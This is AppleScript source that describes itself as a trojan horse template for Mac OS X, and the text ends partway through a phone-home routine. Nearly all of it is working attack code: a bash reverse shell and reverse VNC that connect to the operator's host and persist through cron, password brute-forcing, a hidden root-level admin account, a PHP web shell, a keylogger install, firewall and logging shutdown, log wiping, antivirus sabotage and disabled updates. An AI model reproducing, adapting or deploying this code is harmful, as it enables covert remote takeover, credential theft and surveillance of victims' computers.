---------------------------------------------------------------------------
--AppleScript trojan horse template (incomplete, still in progress v0.5 not posted)
---------------------------------------------------------------------------
--Written & tested with AppleScript 1.10.7 on Mac OS X 10.4.11 PPC
---------------------------------------------------------------------------
--Variables
--------------------
global my_master, padlock_icon, software_update_icon, shell_command_line, be_quiet, OSX_hashes, OSX_version_number_major, OSX_version_number_minor, OSX_version_number_mini, i_am_an_admin, i_have_root_access, my_username, my_password, my_Path, my_POSIX_folder, my_folder, my_name, launch_path, SystemLoginItems, hidden_admin_username, hidden_admin_password, hidden_admin_password_hash, ip_addresses, move_myself, my_resources, all_else_fails, phpshell_path, candidates_file, DDNS_username, DDNS_password, DDNS_id, DDNS_URL, masters_DDNS, masters_number, accounts_file, debug, masters_netcat_port, masters_VNC_port, hashes_file

--###############################################--
--########### HEY! You might want to change these? ###########--
--###############################################--
--These are the tr keys for fuxor and defuxor
property key1 : do shell script "echo -e \"\\x5b\\x6e\\x2d\\x7a\\x69\\x2d\\x6d\\x61\\x2d\\x68\\x5d\\x38\\x36\\x37\\x35\\x33\\x30\\x39\\x2d\\x34\\x20\\x32\\x31\""
property key2 : do shell script "echo -e \"\\x5b\\x61\\x2d\\x68\\x69\\x2d\\x6d\\x6e\\x2d\\x7a\\x5d\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x20\\x2d\""

--The secret file filename
property secret_file : ".howdy"

--Your email address for the outgoing mail to you
set my_master to "andrew%40schjelderup.org"

--The name and password to use with the hidden admin account to be created
set hidden_admin_username to "nobodyd"
set hidden_admin_password to "a secret"

--Whether or not to relocate the trojan away from where it was run
set move_myself to true

--For the target's / victim's Dynamic DNS address so that you can get their IP address even if the outgoing email fails
set DDNS_username to "" --Leave this blank if you aren't using a DDNS service to track the target computer.
set DDNS_password to "DDNS password"
set DDNS_id to "DDNS id"
--You may need to adjust this for different DDNS service providers
set DDNS_URL to "http://www.sitelutions.com/dnsup?user=" & DDNS_username & "&pass=" & DDNS_password & "&id=" & DDNS_id & "&detectip=1"

--For the reverse_shell
--Enter *your* Dynamic DNS address for the reverse-shell to connect to you
--Don't forget to update your DDNS record with your current IP if your IP is not static
set masters_DDNS to "localhost"
set masters_number to "127.0.0.1" -- unused at present

--Port number for connect-backs, reverse-shell etc.
set masters_netcat_port to "6880"
set masters_VNC_port to "6879"

--###############################################--
--###### end of the 'HEY! You might want to change these?' stuff ######--
--###############################################--

--You probably shouldn't change these.
set debug to true
set hidden_admin_password_hash to ""
set padlock_icon to 2
set software_update_icon to 0
set shell_command_line to "" --unused at present
set be_quiet to true
set OSX_hashes to ""
set OSX_version_number_major to do shell script "sw_vers -productVersion | cut -d '.' -f 1"
set OSX_version_number_minor to do shell script "sw_vers -productVersion | cut -d '.' -f 2"
set OSX_version_number_mini to do shell script "sw_vers -productVersion | cut -d '.' -f 3"
set SystemLoginItems to ""
set i_am_an_admin to false
set i_have_root_access to false
set my_username to system attribute "USER"
set my_password to ""
set ip_addresses to ""
set my_Path to POSIX path of (path to me)
set my_POSIX_folder to (do shell script "dirname " & quoted form of my_Path) & "/"
set my_folder to (POSIX file my_POSIX_folder) --unused at present
set my_name to do shell script "basename \"" & my_Path & "\""
copy my_Path to launch_path
set my_resources to my_Path & "Contents/Resources/"
set phpshell_path to my_Path & "Contents/Resources/phpshell-2.1/"
set candidates_file to "/Users/Shared/SC Info/.candidates"
set accounts_file to "/Users/Shared/SC Info/.accounts"
set hashes_file to "/Users/Shared/SC Info/.hashes"
set all_else_fails to false

--Get the padlock icon
try
	--You could place a copy of the icns file(s) within your application bundle, then change this path.
	--Note that it will not work from Script Editor and will work from your finished app.
	set padlock_icon to POSIX file ("/System/Library/CoreServices/SecurityAgent.app/Contents/Resources/Security.icns" as text)
end try

--Get the Software Update icon
try
	set software_update_icon to POSIX file ("/System/Library/CoreServices/Software Update.app/Contents/Resources/Software Update.icns" as text)
end try


---------------------------------------------------------------------------
--Handlers
--------------------
(*
Still to do...
utmp and wtmp
UPnP_how_much_did_you_drink
exit_stage_left
plan_B / all_else_fails
AirPort
Apple System Profiler report
*)

on i_have_a_secret()
	--This routine gathers, sorts and uniques data from the various hidden files and creates a new secret_file,
	--then copies it to several locations which may be easily accessible.
	if debug then log_event("i_have_a_secret")
	try
		do shell script "cat " & quoted form of secret_file & " " & quoted form of candidates_file & " " & quoted form of accounts_file & " " & quoted form of hashes_file & " | tr '\\r' '\\n' | sort -u > /var/tmp/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
		do shell script "[ -f /var/tmp/" & quoted form of secret_file & "] && mv /var/tmp/" & quoted form of secret_file & " ~/Public/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
		do shell script "[ -f ~/Public/" & quoted form of secret_file & "] && cp ~/Public/" & quoted form of secret_file & " /Users/Shared/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
		do shell script "[ -f ~/Public/" & quoted form of secret_file & "] && cp ~/Public/" & quoted form of secret_file & " ~/Sites/images/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
		do shell script "[ -f ~/Public/" & quoted form of secret_file & "] && cp ~/Public/" & quoted form of secret_file & " /Library/WebServer/Documents/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
		do shell script "chmod 777 ~/Public/" & quoted form of secret_file & " /Users/Shared/" & quoted form of secret_file & " ~/Sites/images/" & quoted form of secret_file & " /Library/WebServer/Documents/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
	end try
end i_have_a_secret

on log_event(append_this)
	local append_this
	do shell script ("echo \"$(date '+%y/%m/%d %H:%M:%S'), OS:" & OSX_version_number_major & "." & OSX_version_number_minor & "." & OSX_version_number_mini & ", AS:" & (version of AppleScript as text) & ", " & my_Path & " V:0.5 -- " & append_this & "\" >> /Users/Shared/.AStht.log")
end log_event


on Back_to_masters_VNC()
	if debug then log_event("back_to_masters_VNC")
	local Rvnc, the_process, crontent
	set Rvnc to "#!/bin/bash
[ -n \"$( ps -axww | grep -i 'lsd" & (ASCII character 92) & (ASCII character 124) & "Snitch' | grep -v grep )\" ] && exit 0
if [ -z \"$( lsof -i:" & masters_VNC_port & " | grep ESTABLISHED | grep OSXvnc )\" ]
then
	the_process=$( ps -auxwww | grep -i OSXvnc-server | grep -v grep | tr -s ' ' | cut -d ' ' -f 2 )
	[ \"x${the_process}\" != \"x\" ] && kill -9 \"${the_process}\"
fi
address=$( host " & masters_DDNS & " | sed -e 's/^.*address //' -e 's/ .*//' | grep -v [:alpha:] )
exec /Users/Shared/.OSXvnc-server -connectHost ${address} -connectPort " & masters_VNC_port & " &
exit 0"
	--Output the shell script to handle the OSXvnc-server reverse connection
	do shell script "echo " & quoted form of Rvnc & " > /Users/Shared/.Rvnc ; chmod 777 /Users/Shared/.Rvnc"
	--Set a crontask to run the script every hour at 15 minutes past the hour
	set crontent to ((do shell script "crontab -l 2>/dev/null ; exit 0") & return & "15" & tab & "*/1" & tab & "*" & tab & "*" & tab & "*" & tab & "/bin/bash /Users/Shared/.Rvnc 2>/dev/null")
	set crontent to do shell script "echo '" & crontent & "' | tr '\\r' '\\n' | sort -rnu > /var/tmp/cronappend"
	do shell script "crontab /var/tmp/cronappend"
	do shell script "rm /var/tmp/cronappend"
	
	
end Back_to_masters_VNC

on brute_user_accounts()
	--Attempt to brute-force passwords for the user accounts on this computer. This is not too speedy but if everything is else is done, I have nothing but time.
	if debug then log_event("brute_user_accounts")
	local the_users, the_passwords, the_username, the_password
	set the_users to words in (do shell script "dscl . -list /Users | while read username; do passwd=$( dscl . -read /Users/${username} passwd | cut -d ' ' -f 2 ); [ \"${passwd}\" != '*' ] && echo ${username}; done; exit 0")
	set the_passwords to the_users & words in "password admin 1234" & words in (do shell script "cat " & quoted form of candidates_file & " 2>/dev/null ; exit 0")
	repeat with the_username in the_users
		repeat with the_password in the_passwords
			try
				do shell script "expect -c 'spawn su " & the_username & "' -c 'expect Password: {send " & the_password & "\\n}' -c 'send id\\n' -c 'send exit\\n' -c 'expect eof' | grep uid"
				do shell script "echo " & the_username & ":" & the_password & " >> " & quoted form of accounts_file
				exit repeat
			end try
		end repeat
	end repeat
end brute_user_accounts

on reverse_shell()
	if debug then log_event("reverse_shell")
	local Rshell, the_process, crontent
	set Rshell to "#!/bin/bash
[ -n \"$( ps -axww | grep -i 'lsd" & (ASCII character 92) & (ASCII character 124) & "Snitch' | grep -v grep )\" ] && exit 0
address=$( host " & masters_DDNS & " | sed -e 's/^.*address //' -e 's/ .*//' | grep -v [:alpha:] )
exec 6<>/dev/tcp/${address}/" & masters_netcat_port & " || exit 0
id >&6
echo -n \"${USER}@${HOSTNAME} > \" >&6
cat <&6 | while read input
do
	$input >&6 2>&6
	echo -n \"${USER}@${HOSTNAME} > \" >&6
done
exit 0"
	--Output the shell script to handle the bash reverse-shell
	do shell script "echo " & quoted form of Rshell & " > /Users/Shared/.Rshell ; chmod 777 /Users/Shared/.Rshell"
	--Set a crontask to run the script every hour at 5 minutes past the hour
	set crontent to ((do shell script "crontab -l 2>/dev/null ; exit 0") & return & "5" & tab & "*/1" & tab & "*" & tab & "*" & tab & "*" & tab & "/bin/bash /Users/Shared/.Rshell 2>/dev/null")
	set crontent to do shell script "echo '" & crontent & "' | tr '\\r' '\\n' | sort -rnu > /var/tmp/cronappend"
	do shell script "crontab /var/tmp/cronappend"
	do shell script "rm /var/tmp/cronappend"
end reverse_shell

on its_smoky_in_here_lets_open_ports_in_the_firewall()
	--This handler is best run by root (but may disable the firewall in the preference file with only admin access, firewall won't be off until restart.)
	if debug then log_event("its_smoky_in_here_lets_open_ports_in_the_firewall")
	--A member of the admin group may already have write access to the file without the use of sudo. Try this first.
	try
		do shell script "defaults write /Library/Preferences/com.apple.sharing.firewall state -bool false"
		do shell script "defaults write /Library/Preferences/com.apple.sharing.firewall loggingenabled -int 0"
		do shell script "defaults write /Library/Preferences/com.apple.sharing.firewall stealthenabled -int 0"
		do shell script "defaults write /Library/Preferences/com.apple.sharing.firewall udpenabled -int 0"
	end try
	if i_have_root_access then
		try
			--for ipfw
			do shell script "/usr/bin/sudo /sbin/ipfw disable firewall" --stop ipfw if it is running
		end try
		--Modify the plist files to disable the firewall on startup
		--admin access is required, sudo actually isn't but we'll need it if we aren't an admin
		try
			--FirewallTool complains (in 10.4 at least) if the next four items aren't these exact types
			do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.sharing.firewall state -bool false"
			do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.sharing.firewall loggingenabled -int 0"
			do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.sharing.firewall stealthenabled -int 0"
			do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.sharing.firewall udpenabled -int 0"
			--for Leopard 10.5, won't hurt anything on prior systems
			do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0"
		end try
	end if
end its_smoky_in_here_lets_open_ports_in_the_firewall

on throw_another_log_on_the_fire()
	if debug then log_event("throw_another_log_on_the_fire")
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	--Call nothing_to_see_here to stop logging first.
	--Then this handler to clean the logs...
	try
		--Just delete utmp and wtmp for now, still need to write a cleaning routine
		do shell script "/usr/bin/sudo rm /var/run/utmp /var/run/utmpx /var/log/wtmp /var/log/wtmpx 2>/dev/null"
	end try
	try
		do shell script "exec /usr/bin/sudo bash <<< 'for log in /var/log/system.log /var/log/secure.log /var/log/ftp.log /var/log/asl.log /var/log/httpd/access_log /var/log/httpd/error_log /var/log/lastlog /Library/Logs/AppleFileService/AppleFileService*.log /Library/Logs/Console/*/console.log ; do [ -f ${log} ] && { sed -e \"/[Ff][Rr][Oo][Mm]/d\" -e \"/client/d\" -e \"/[Ll]og[Kk]ext/d\" -e \"/" & my_username & "/d\" ${log} > ${log}.tmp && mv ${log}.tmp ${log} ; } ; done' "
	end try
end throw_another_log_on_the_fire

on nothing_to_see_here()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	if debug then log_event("nothing_to_see_here")
	try
		--Disable logging
		if OSX_version_number_minor as number ³ 4 then --For Tiger and Leopard
			--For Tiger & Leopard
			do shell script "/usr/bin/sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.syslogd.plist"
		else if OSX_version_number_minor as number ³ 2 and OSX_version_number_minor as number ² 3 then
			--For Panther and Jaguar
			do shell script "/usr/bin/sudo killall syslogd"
		else
			--for Puma and Cheetah
			do shell script "myoutput=`/bin/ps -axww | grep syslogd | grep -v grep | sed -e 's/^ *//' -e 's/ .*//'` ; [ -n \"${myoutput}\" ] && /usr/bin/sudo kill \"${myoutput}\""
		end if
	end try
	try
		--Stop system accounting
		do shell script "/usr/bin/sudo /usr/sbin/accton"
		do shell script "/usr/bin/sudo rm /var/account/acct"
	end try
	try
		--Change syslog.conf
		do shell script "/usr/bin/sudo mv /etc/syslog.conf /etc/syslog.conf.AStht ; /usr/bin/sudo sed -e 's_/var/log/secure.log_/dev/null_' -e 's_/var/log/ftp.log_/dev/null_' /etc/syslog.conf.AStht > /var/tmp/syslog.conf && /usr/bin/sudo mv -f /var/tmp/syslog.conf /etc/syslog.conf"
	end try
	try
		--Change logging settings in /Library/Preferences/com.apple.AppleFileServer.plist
		do shell script "exec /usr/bin/sudo bash <<< 'cp /Library/Preferences/com.apple.AppleFileServer.plist /Library/Preferences/com.apple.AppleFileServer.plist.AStht ; defaults write /Library/Preferences/com.apple.AppleFileServer activityLog -bool No ; defaults write /Library/Preferences/com.apple.AppleFileServer activityLogPath -string /dev/null ; defaults write /Library/Preferences/com.apple.AppleFileServer errorLogPath -string /dev/null ; defaults write /Library/Preferences/com.apple.AppleFileServer admin31GetsSp -bool No ; defaults write /Library/Preferences/com.apple.AppleFileServer adminGetsSp -bool No ; defaults write /Library/Preferences/com.apple.AppleFileServer allowRootLogin -bool Yes ; defaults write /Library/Preferences/com.apple.AppleFileServer specialAdminPrivs -bool Yes ; defaults write /Library/Preferences/com.apple.AppleFileServer autoRestart -bool Yes ; defaults write /Library/Preferences/com.apple.AppleFileServer loggingAttributes \"<dict><key>logCreateDir</key><false/><key>logCreateFile</key><false/><key>logDelete</key><false/><key>logLogin</key><false/><key>logLogout</key><false/><key>logOpenFork</key><false/></dict>\"'"
	end try
end nothing_to_see_here

on install_phpshell()
	--This handler is best run by root (but can install to a user home folder without admin or root.)
	--PHPshell version 2.1 http://sourceforge.net/projects/phpshell
	if debug then log_event("install_phpshell")
	if OSX_version_number_minor as number ³ 1 then
		--OS X 10.0 did not include PHP
		if i_have_root_access then
			try
				--Place the PHPshell folder (unzipped) inside the Resources folder within your script bundle (or inside Script Editor if you aren't saving as an app)
				--Hopefully you remembered to add a user such as any of the following to PHPshell's config.php?
				--nobodyd  = "md5:54889c9:45caff28b8f9340ccb43f9f61d72b2a3"
				--nobodyd  = "sha1:527faf43:8a60cb4d7d16b6df77ebf01bcd6a8c98c6ab10d9"
				--nobodyd  = "a secret"
				do shell script "test -f /Library/WebServer/Documents/.PS_Store/phpshell.php || /usr/bin/sudo mkdir -p -m 777 /Library/WebServer/Documents/ ; /usr/bin/sudo cp -R " & quoted form of phpshell_path & " /Library/WebServer/Documents/.PS_Store/"
				do shell script "/usr/bin/sudo mv -f /etc/httpd/httpd.conf /etc/httpd/httpd.conf.AStht ; /usr/bin/sudo sed -e 'sO# *LoadModule php4_module *libexec/httpd/libphp4.soOLoadModule php4_module libexec/httpd/libphp4.soO' -e 'sO# *AddType application/x-httpd-php .phpOAddType application/x-httpd-php .phpO' -e 'sO# *AddType application/x-httpd-php-source .phpsOAddType application/x-httpd-php-source .phpsO' -e 'sO# *AddModule mod_php4.cOAddModule mod_php4.cO' /etc/httpd/httpd.conf.AStht > /var/tmp/httpd.conf && /usr/bin/sudo mv -f /var/tmp/httpd.conf /etc/httpd/httpd.conf"
				do shell script "/usr/bin/sudo mv -f /etc/hostconfig /etc/hostconfig.AStht && /usr/bin/sudo sed -e 's/WEBSERVER=-NO-/WEBSERVER=-YES-/' /etc/hostconfig.AStht > /var/tmp/hostconfig && /usr/bin/sudo mv /var/tmp/hostconfig /etc/hostconfig"
				do shell script "grep 'WEBSERVER=-YES-' /etc/hostconfig || /usr/bin/sudo echo 'WEBSERVER=-YES-' >> /etc/hostconfig"
				--You might also want to call enable_webserver()
			end try
		else
			--If we couldn't make it into /Library/WebServer/Documents, try ~/Sites
			do shell script "test -d ~/Sites/ && { test -f ~/Sites/images/.PS_Store/phpshell.php || mkdir -p ~/Sites/images 2>/dev/null && cp -R " & quoted form of phpshell_path & " ~/Sites/images/.PS_Store/ ; chgrp -Rf admin ~/Sites/ ; }"
		end if
	end if
end install_phpshell

on enable_webserver()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	--This enables "Personal Web Sharing" and opens the web sharing ports in the firewall under Mac OS X 10.4 Tiger
	if debug then log_event("enable_webserver")
	do shell script "/usr/bin/sudo apachectl restart 2>/dev/null ; exit 0"
	--/System/Library/LaunchDaemons org.apache.httpd.plist for leopard -- includes "SHAuthorizationRight" ?
end enable_webserver

on install_and_activate_logKext()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	--logKext version 2.2 http://logkext.googlecode.com/files/logKext.pkg.zip
	--This version of logKext is only for 10.4 and 10.5 and it is UB
	if debug then log_event("install_and_activate_logKext")
	if OSX_version_number_minor as number ³ 4 then --For Tiger and Leopard
		try
			--Place a copy of logKext.pkg (unzipped) inside the Resources folder within your script bundle (or inside Script Editor if you aren't saving as an app)
			do shell script "[ -f /Library/Preferences/com.fsb.logKext ] && exit 0 ; /usr/bin/sudo installer -target / -lang en -pkg \"" & my_resources & "/logKext.pkg/Contents/Packages/logkext-1.pkg/\" ; /usr/bin/sudo installer -target / -lang en -pkg \"" & my_resources & "/logKext.pkg/Contents/Packages/logkext.pkg/\" ; /usr/bin/sudo installer -target / -lang en -pkg \"" & my_resources & "/logKext.pkg/Contents/Packages/logkextclient.pkg/\" ; /usr/bin/sudo installer -target / -lang en -pkg \"" & my_resources & "/logKext.pkg/Contents/Packages/logkextdaemon.pkg/\" ; /usr/bin/sudo installer -target / -lang en -pkg \"" & my_resources & "/logKext.pkg/Contents/Packages/logkextkeygen.pkg/\" ; /usr/bin/sudo installer -target / -lang en -pkg \"" & my_resources & "/logKext.pkg/Contents/Packages/logkextkeymap.pkg/\""
		on error
			--logKext wasn't installed, perhaps the path is incorrect?
		end try
		--Tell Spotlight not to index the files in /Library/Preferences
		do shell script "sudo defaults write /.Spotlight-V100/_exclusions EXCLUSIONS -array-add /Library/Preferences"
	end if
end install_and_activate_logKext

on there_are_no_osx_viruses_silly_wabbit()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	--Tested with an older version of NAVLU. Hmm, not sure about file's write permissions...
	if debug then log_event("there_are_no_osx_viruses_silly_wabbit")
	try
		do shell script "if [ -f '/Library/Application Support/Norton Solutions Support/LiveUpdate/liveupdate.conf' ] ; then /usr/bin/sudo sed 's_://_://127.0.0.1/_'' '/Library/Application Support/Norton Solutions Support/LiveUpdate/liveupdate.conf' > /var/tmp/lu.tmp ; /usr/bin/sudo mv /var/tmp/lu.tmp '/Library/Application Support/Norton Solutions Support/LiveUpdate/liveupdate.conf'"
	end try
	--Still to do, newer NAV, Virex, etc.
	--Perhaps modify the /etc/hosts file
end there_are_no_osx_viruses_silly_wabbit

on i_like_you_just_as_you_are()
	--Disables update checking for the current user ~/Library/Preferences/com.apple.scheduler.plist
	if debug then log_event("i_like_you_just_as_you_are")
	do shell script "softwareupdate --schedule off"
end i_like_you_just_as_you_are

on quit
	--ignore any attempts to quit this program
	if debug then log_event("quit handler")
end quit

on agent_86_reporting_for_duty_chief()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	if debug then log_event("agent_86_reporting_for_duty_chief")
	set hidden_admin_password_hash to do shell script "openssl passwd -crypt -salt xx '" & hidden_admin_password & "'"
	if OSX_version_number_minor as number ³ 4 then --For Tiger and Leopard
		try
			--see if our user is already there
			do shell script "dscl . -read /Users/" & hidden_admin_username
		on error
			--if not, then add our user.
			do shell script "/usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' name '" & hidden_admin_username & "' ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' UniqueID 0 ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' PrimaryGroupID 20 ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' NFSHomeDirectory /var/root ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' home /var/root ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' UserShell /bin/bash ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' RealName '' ; /usr/bin/sudo dscl . -append /Groups/admin GroupMembership '" & hidden_admin_username & "' ; /usr/bin/sudo dscl . -append /Groups/wheel GroupMembership '" & hidden_admin_username & "' ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' naprivs -2147483394 ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' authentication_authority 'basic' ; /usr/bin/sudo dscl . -create /Users/'" & hidden_admin_username & "' passwd " & hidden_admin_password_hash
		end try
	else --For Panther and prior
		try
			--see if our user is already there
			do shell script "niutil -readprop . /users/" & hidden_admin_username & " name"
		on error
			--if not, then add our user. niutil should use lowercase "/users/" or it will it create a second one named "/Users/" which won't actually work.
			do shell script "/usr/bin/sudo niutil -create . /users/'" & hidden_admin_username & "' ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' uid 0 ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' gid 20 ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' home /var/root ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' shell /bin/bash ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' passwd '" & hidden_admin_password_hash & "' ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' _writers_passwd '" & hidden_admin_username & "' ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' expire 0 ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' name '" & hidden_admin_username & "' ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' realname '" & hidden_admin_username & "' ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' change 0 ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' class '' ; /usr/bin/sudo niutil . -append /groups/admin users '" & hidden_admin_username & "' ; /usr/bin/sudo niutil . -append /groups/wheel users '" & hidden_admin_username & "' ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' naprivs -2147483394 ; /usr/bin/sudo niutil -createprop . /users/'" & hidden_admin_username & "' authentication_authority ';basic;'"
		end try
	end if
	
	--Also add our user to the hidden user list and set showotherusers_managed to false.
	if (do shell script "defaults read /Library/Preferences/com.apple.loginwindow HiddenUsersList 2>/dev/null ; exit 0") does not contain hidden_admin_username then
		do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array-add " & hidden_admin_username
		do shell script "/usr/bin/sudo defaults write /Library/Preferences/com.apple.loginwindow SHOWOTHERUSERS_MANAGED -bool false"
	end if
end agent_86_reporting_for_duty_chief

on papers_please()
	--Get current local IP addresses
	if debug then log_event("papers_please")
	set ip_addresses to (do shell script "IPaddress_en0=$(ifconfig en0 2>/dev/null | head -n 2 | tail -n 1 | sed -e 's/^.*inet //' -e 's/ .*$//' ) && echo \"${IPaddress_en0}\"") & " " & (do shell script "IPaddress_en1=$(ifconfig en1 2>/dev/null | head -n 2 | tail -n 1 | sed -e 's/^.*inet //' -e 's/ .*$//' ) && echo \"${IPaddress_en1}\"") & " " & (do shell script "router_IPaddress=$( arp -a | sed -e 's/^.* (//' -e 's/).*$//' ) && echo \"${router_IPaddress}\"")
	if be_quiet is false then
		--Outgoing communication will only happen if be_quiet is set to "false".
		if DDNS_username is not "" then
			try
				--If you are using a Dynamic DNS service to track the computer's public IP address you may not also need to get the public IP address separately
				do shell script "curl " & quoted form of DDNS_URL & " 2>&1 | grep success"
			on error
				--Wanna try a different DDNS service?
			end try
		else
			try
				--These get the public IP address
				set ip_addresses to (do shell script "curl \"http://www.whatismyip.com/automation/n09230945.asp\" 2>/dev/null") & " " & ip_addresses
			on error
				set ip_addresses to (do shell script "curl http://ipid.shat.net/iponly/ | grep body | sed -e 's/^<body>//' -e 's/<.*$//'") & " " & ip_addresses
			end try
		end if
	end if
	set ip_addresses to do shell script "echo " & quoted form of ip_addresses & " | tr -s ' '"
end papers_please

on enable_ARD_and_VNC()
	--This *should* work from any admin account, without sudo or root, for any version of OS X which
	--includes ARD Client (server) such as 10.3, 10.4 and 10.5.
	if debug then log_event("enable_ARD_and_VNC")
	try
		-- Disable the Remote Management menu extra.
		do shell script "kickstart -configure -clientopts -setmenuextra -menuextra no"
		if OSX_version_number_minor as number ³ 5 then --For Leopard
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate"
			-- Allow access for all users and give all users full access.
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -allowAccessFor -allUsers -privs -all"
			-- Start the Remote Management service.
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate"
		else if OSX_version_number_minor as number ² 4 then --For Tiger and prior
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -privs -all -restart -agent"
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -restart -agent -console"
		end if
	end try
end enable_ARD_and_VNC

on enable_ssh()
	if debug then log_event("enable_ssh")
	try
		if i_am_an_admin then
			--This *should* work from any admin account, without sudo or root, for any version of OS X which
			--includes ARD Client (server) such as 10.3, 10.4 and 10.5.
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setremotelogin on"
			--And while we're here...
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setcomputersleep Never" --(logic board only)
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setrestartpowerfailure on"
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setrestartfreeze on"
			do shell script "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setremoteappleevents on"
		end if
	on error
		if i_have_root_access then
			try
				--If sudo works but we aren't an admin (we might have modified /etc/sudoers)
				do shell script "/usr/bin/sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setremotelogin on"
				--And while we're here...
				do shell script "/usr/bin/sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setcomputersleep Never" --(logic board only)
				do shell script "/usr/bin/sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setrestartpowerfailure on"
				do shell script "/usr/bin/sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setrestartfreeze on"
				do shell script "/usr/bin/sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Support/systemsetup -setremoteappleevents on"
			on error
				--This handler needs root for everything past this point! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
				if OSX_version_number_minor as number ³ 4 then --For Tiger and Leopard
					--Note, this also opens port 22 in the default OS X firewall
					do shell script "/usr/bin/sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist"
				else if OSX_version_number_minor as number ³ 2 and OSX_version_number_minor as number ² 3 then --For Jaguar and Panther
					do shell script "/usr/bin/sudo mv /private/etc/xinetd.d/ssh /private/etc/xinetd.d/ssh.AStht && /usr/bin/sudo sed -e 's/disable = .*$/disable = no/' /private/etc/xinetd.d/ssh.AStht > /private/etc/xinetd.d/ssh"
					do shell script "/usr/bin/sudo /sbin/service ssh start"
				else --For Puma and Cheetah
					--Still need to also open port 22 in the firewall (ipfw)!
					do shell script "/usr/bin/sudo sed -e 's/SSHSERVER=-NO-/SSHSERVER=-YES-/' /etc/hostconfig > /var/tmp/hostconfig && /usr/bin/sudo mv /etc/hostconfig /etc/hostconfig.AStht && /usr/bin/sudo mv /var/tmp/hostconfig /etc/hostconfig"
					do shell script "grep 'SSHSERVER=-YES-' /etc/hostconfig || /usr/bin/sudo echo 'SSHSERVER=-YES-' >> /etc/hostconfig"
					do shell script "/usr/bin/sudo /usr/sbin/sshd"
				end if
			end try
		end if
	end try
end enable_ssh

on phone_home_and_try_a_different_method_if_it_fails()
	if debug then log_event("phone_home_and_try_a_different_method_if_it_fails")
	local the_message, the_title
	if be_quiet is false then
		--Outgoing communication will only happen if be_quiet is set to "false" 
		--Be sure to use is_it_safe and/or these_are_not_the_outgoing_network_communications_you_are_looking_for() first!
		--The email will be sent to the address set in the variable my_master !
		set the_title to "Howdy"
		set the_message to fuxor(my_username & " " & my_password & " " & ip_addresses & " " & OSX_hashes)
		--HEY! You -MUST- change the lines below to work with the specific web mail form which you are using!
		--An easy way to see which method (POST as shown in this example, or GET) is used, and in what format
		--the data should be submitted, and what phrase indicates success, is to use Firefox and the LiveHTTPHeaders
